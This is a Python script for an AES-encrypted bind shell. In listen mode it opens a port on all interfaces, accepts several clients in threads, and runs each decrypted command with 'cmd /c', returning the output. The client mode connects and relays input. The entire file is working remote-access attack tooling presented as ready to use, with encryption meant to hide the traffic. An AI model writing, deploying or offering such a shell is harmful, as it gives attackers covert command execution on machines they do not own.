# Script to implement Encrypted Bind Shell

# Importing Modules
import socket, subprocess, threading, argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Configuring Variables
DEFAULT_PORT = 1234
MAX_BUFFER = 4096

# Creating a class for encryption
class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)

    def __str__(self):
        return "Key -> {}".format(self.key.hex())

# Helper function to send the encrypted data
def encrypted_send(s, msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))

# Creating an Execute Command
def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"Command Failed!"
    return output


# Function to decode and strip data
def decode_and_strip(s):
    return s.decode("latin-1").strip()

# Using Threading (For multiple users)
def shell_thread(s):
    encrypted_send(s, b"[-- Connected --]")
    try:
        while True:
            encrypted_send(s,b"\r\nEnter Command >> ")

            data = s.recv(MAX_BUFFER)
            if data:
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)

                if not buffer or buffer =="exit":
                    s.close()
                    exit()

            print("> Executing command: '{}'".format(buffer))
            encrypted_send(s, execute_cmd(buffer))
    except:
        s.close()
        exit()

# Function to send data
def send_thread(s):
    try:
        while True:
            data = input() +"\n"
            encrypted_send(s, data.encode("latin-1"))
    except:
        s.close()
        exit()

# Function to recieve data
def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode("latin-1")
                print(data, end = "", flush=True) 
    except:
        s.close()
        exit()

# Setting up the server
def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()

    print("[-- Starting Bind Shell --]")
    while True:
        client_socket, addr = s.accept()
        print("[-- New User Connected --]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

# Setting the client
def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print("[-- Connecting to Bind Shell --]")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

# Using argparse to establish client or server
parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell listner", required=False)
parser.add_argument("-c", "--connect", help="Connect to a bind shell", required=False)
parser.add_argument("-k", "--key", help="AES Encryption Key", type=str, required=False)

args = parser.parse_args()

if args.connect and not args.key:
    parser.error("-c CONNECT requires -k KEY")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    server()
elif args.connect:
    client(args.connect)